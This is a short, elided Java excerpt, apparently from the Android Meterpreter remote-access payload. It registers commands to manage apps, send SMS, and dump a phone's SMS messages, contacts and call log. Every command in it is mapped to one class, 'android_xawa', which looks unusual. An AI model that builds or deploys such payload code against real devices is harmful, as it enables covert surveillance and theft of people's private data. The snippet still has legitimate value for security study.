...
public class AndroidMeterpreter extends Meterpreter {
    ...
    public Integer[] loadExtension(byte[] data) throws Exception {
        ...
        if (context != null) {
            mgr.registerCommand(CommandId.APPAPI_APP_LIST, android_xawa.class);
            mgr.registerCommand(CommandId.APPAPI_APP_RUN, android_xawa.class);
            mgr.registerCommand(CommandId.APPAPI_APP_INSTALL, android_xawa.class);
            mgr.registerCommand(CommandId.APPAPI_APP_UNINSTALL, android_xawa.class);
            ...
            mgr.registerCommand(CommandId.ANDROID_SEND_SMS, android_xawa.class);
            mgr.registerCommand(CommandId.ANDROID_DUMP_SMS, android_xawa.class);
            mgr.registerCommand(CommandId.ANDROID_DUMP_CONTACTS, android_xawa.class);
            mgr.registerCommand(CommandId.ANDROID_DUMP_CALLLOG, android_xawa.class);
